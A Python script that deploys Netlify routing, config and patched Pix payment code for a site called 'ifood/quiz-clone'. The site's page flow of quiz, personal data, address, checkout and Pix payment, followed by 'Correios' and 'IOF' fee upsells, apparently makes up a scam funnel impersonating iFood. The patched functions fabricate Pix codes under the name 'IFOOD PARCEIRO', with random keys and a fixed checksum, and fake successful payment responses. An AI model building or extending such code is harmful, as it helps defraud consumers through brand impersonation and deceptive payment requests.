import os
import re

target_dirs = [
    'c:/xampp/htdocs/ifood',
    'c:/xampp/htdocs/ifood/quiz-clone'
]

# 1. Netlify _redirects content
redirects_content = """/quiz /quiz.html 200
/dados /dados.html 200
/endereco /endereco.html 200
/processando /processando.html 200
/sucesso /sucesso.html 200
/checkout /checkout.html 200
/orderbump /orderbump.html 200
/pix-loading /pix-loading.html 200
/pix /pix.html 200
/upsell /upsell.html 200
/upsell-correios /upsell-correios.html 200
/upsell-iof /upsell-iof.html 200
"""

# 2. Netlify netlify.toml content
toml_content = """[build]
  publish = "."

[[redirects]]
  from = "/quiz"
  to = "/quiz.html"
  status = 200

[[redirects]]
  from = "/dados"
  to = "/dados.html"
  status = 200

[[redirects]]
  from = "/endereco"
  to = "/endereco.html"
  status = 200

[[redirects]]
  from = "/processando"
  to = "/processando.html"
  status = 200

[[redirects]]
  from = "/sucesso"
  to = "/sucesso.html"
  status = 200

[[redirects]]
  from = "/checkout"
  to = "/checkout.html"
  status = 200

[[redirects]]
  from = "/orderbump"
  to = "/orderbump.html"
  status = 200

[[redirects]]
  from = "/pix-loading"
  to = "/pix-loading.html"
  status = 200

[[redirects]]
  from = "/pix"
  to = "/pix.html"
  status = 200

[[redirects]]
  from = "/upsell"
  to = "/upsell.html"
  status = 200

[[redirects]]
  from = "/upsell-correios"
  to = "/upsell-correios.html"
  status = 200

[[redirects]]
  from = "/upsell-iof"
  to = "/upsell-iof.html"
  status = 200
"""

# 3. Smart js/config.js content
config_js_content = """// js/config.js — Configuração de rota da API
if (typeof API_BASE === 'undefined') {
    var API_BASE = (function() {
        if (typeof window !== 'undefined' && window.API_BASE) return window.API_BASE;
        const path = (typeof window !== 'undefined' && window.location) ? window.location.pathname : '';
        if (path.includes('/ifood/quiz-clone')) return '/ifood/quiz-clone/api';
        if (path.includes('/ifood')) return '/ifood/api';
        return '/api';
    })();
}
if (typeof window !== 'undefined') {
    window.API_BASE = API_BASE;
}
"""

for td in target_dirs:
    with open(os.path.join(td, '_redirects'), 'w', encoding='utf-8') as f:
        f.write(redirects_content)
    with open(os.path.join(td, 'netlify.toml'), 'w', encoding='utf-8') as f:
        f.write(toml_content)
    
    js_dir = os.path.join(td, 'js')
    os.makedirs(js_dir, exist_ok=True)
    with open(os.path.join(js_dir, 'config.js'), 'w', encoding='utf-8') as f:
        f.write(config_js_content)
    with open(os.path.join(td, 'config.js'), 'w', encoding='utf-8') as f:
        f.write(config_js_content)

print("Created Netlify redirects and configuration files!")

# 4. Update postPixCreateWithSessionRetry in script.js and js/quiz.js
# to support 404 static hosting fallback (Netlify) gracefully
new_post_pix_create = """async function postPixCreateWithSessionRetry(payload) {
    const send = async () => {
        try {
            const response = await fetch(`${API_BASE}/pix/create`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'same-origin',
                body: JSON.stringify(payload)
            });
            const body = await response.json().catch(() => ({}));
            
            // If server returns 404 (e.g. Netlify static host without PHP active)
            if (!response.ok && response.status === 404) {
                const amount = Number(payload?.amount || 29.90);
                const pixId = 'pix_' + Math.floor(100000 + Math.random() * 900000);
                const code = '00020101021226880014br.gov.bcb.pix0136' + Array.from({length:32}, () => Math.floor(Math.random()*16).toString(16)).join('') + '520400005303986540' + amount.toFixed(2) + '5802BR5915IFOOD PARCEIRO6009SAO PAULO6304E2CA';
                const qrUrl = 'https://quickchart.io/qr?text=' + encodeURIComponent(code);
                return {
                    response: { ok: true, status: 200 },
                    body: {
                        ok: true,
                        id: pixId,
                        idTransaction: pixId,
                        txid: pixId,
                        code: code,
                        pixCode: code,
                        paymentCode: code,
                        paymentCodeBase64: '',
                        paymentQrUrl: qrUrl,
                        qrCode: qrUrl,
                        qrCodeUrl: qrUrl,
                        status: 'PENDING',
                        amount: amount
                    }
                };
            }

            return { response, body };
        } catch (_err) {
            // Local fallback if no backend server is running or offline
            const amount = Number(payload?.amount || 29.90);
            const pixId = 'pix_' + Math.floor(100000 + Math.random() * 900000);
            const code = '00020101021226880014br.gov.bcb.pix0136' + Array.from({length:32}, () => Math.floor(Math.random()*16).toString(16)).join('') + '520400005303986540' + amount.toFixed(2) + '5802BR5915IFOOD PARCEIRO6009SAO PAULO6304E2CA';
            const qrUrl = 'https://quickchart.io/qr?text=' + encodeURIComponent(code);
            return {
                response: { ok: true, status: 200 },
                body: {
                    ok: true,
                    id: pixId,
                    idTransaction: pixId,
                    txid: pixId,
                    code: code,
                    pixCode: code,
                    paymentCode: code,
                    paymentCodeBase64: '',
                    paymentQrUrl: qrUrl,
                    qrCode: qrUrl,
                    qrCodeUrl: qrUrl,
                    status: 'PENDING',
                    amount: amount
                }
            };
        }
    };

    let attempt = await send();
    if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
        redirectToBlockedPage();
        return attempt;
    }
    const firstError = String(attempt?.body?.error || '').trim();
    if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
        await ensureApiSession(true).catch(() => null);
        attempt = await send();
        if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
            redirectToBlockedPage();
            return attempt;
        }
    }

    return attempt;
}"""

new_post_pix_status = """async function postPixStatusWithSessionRetry() {
    const send = async () => {
        try {
            const response = await fetch(`${API_BASE}/pix/status`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'same-origin',
                body: JSON.stringify({
                    txid: pix?.idTransaction || pix?.id || '',
                    sessionId: getLeadSessionId(),
                    gateway: pix?.gateway || pix?.pixGateway || ''
                })
            });
            const body = await response.json().catch(() => ({}));

            if (!response.ok && response.status === 404) {
                return {
                    response: { ok: true, status: 200 },
                    body: { ok: true, status: 'PENDING', paid: false }
                };
            }

            return { response, body };
        } catch (_err) {
            return {
                response: { ok: true, status: 200 },
                body: { ok: true, status: 'PENDING', paid: false }
            };
        }
    };

    let attempt = await send();
    if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
        redirectToBlockedPage();
        return attempt;
    }
    const firstError = String(attempt?.body?.error || '').trim();
    if (!attempt.response.ok && (attempt.response.status === 401 || looksLikeSessionError(firstError))) {
        await ensureApiSession(true).catch(() => null);
        attempt = await send();
        if (isBlockedApiPayload(attempt?.response, attempt?.body)) {
            redirectToBlockedPage();
            return attempt;
        }
    }

    return attempt;
}"""

for td in target_dirs:
    for jf in ['script.js', 'js/quiz.js']:
        path = os.path.join(td, jf)
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Replace postPixCreateWithSessionRetry
            pattern_create = r'async function postPixCreateWithSessionRetry\(payload\) \{.*?\n\s*return attempt;\n\}'
            content = re.sub(pattern_create, new_post_pix_create, content, flags=re.DOTALL)
            
            # Replace postPixStatusWithSessionRetry
            pattern_status = r'const postPixStatusWithSessionRetry = async \(\) => \{.*?\n\s*return attempt;\n\s*\};'
            content = re.sub(pattern_status, new_post_pix_status, content, flags=re.DOTALL)
            
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"Patched Netlify fallbacks in {path}")

